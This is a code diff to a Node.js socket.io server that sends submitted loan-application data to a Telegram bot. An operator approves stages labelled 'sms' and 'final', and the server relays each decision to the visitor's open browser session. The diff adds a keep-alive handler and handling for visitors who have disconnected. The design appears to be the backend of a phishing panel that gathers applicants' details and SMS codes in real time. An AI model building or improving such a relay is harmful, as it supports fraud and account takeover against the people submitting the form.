@@ -25,6 +25,11 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
     console.log('A user connected:', socket.id);
 
+    // Keep-alive ping from browser
+    socket.on('ping', () => {
+        // Ping received, do nothing but keep connection open
+    });
+
     // 1. Initial Application Submit
     socket.on('submit_loan', async (data) => {
         const msg = `
@@ -106,7 +111,6 @@ io.on('connection', (socket) => {
 
 // --- HELPER FUNCTION TO UPDATE TELEGRAM MESSAGE STATUS ---
 async function updateMessageStatus(query, originalText, newStatus) {
-    // Replace the "Waiting" text with the new status
     const updatedText = originalText.replace('⏳ <b>Status:</b> Waiting for your decision...', newStatus);
     
     try {
@@ -114,7 +118,7 @@ async function updateMessageStatus(query, originalText, newStatus) {
             chat_id: query.message.chat.id,
             message_id: query.message.message_id,
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] } // Removes buttons after action
+            reply_markup: { inline_keyboard: [] } // Removes buttons
         });
     } catch (err) {
         console.error("Error editing message:", err.message);
@@ -126,13 +130,13 @@ bot.on('callback_query', async (query) => {
     const data = query.data.split('_');
     const socketId = data[data.length - 1]; 
     const userSocket = io.sockets.sockets.get(socketId);
-    
-    if (!userSocket) {
-        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or refreshed the page.' });
-    }
-
-    // Get the original text from the message we are replying to
     const originalText = query.message.text;
+
+    // Check if user is offline (e.g. they closed the browser)
+    if (!userSocket) {
+        await updateMessageStatus(query, originalText, '⚠️ <b>Status:</b> USER DISCONNECTED (Action recorded, but user closed the page)');
+        return bot.answerCallbackQuery(query.id, { text: 'User is offline, but status updated.' });
+    }
 
     // --- STEP 1: APPLICATION APPROVAL ---
     if (query.data.startsWith('approve_') && !query.data.includes('sms') && !query.data.includes('final')) {
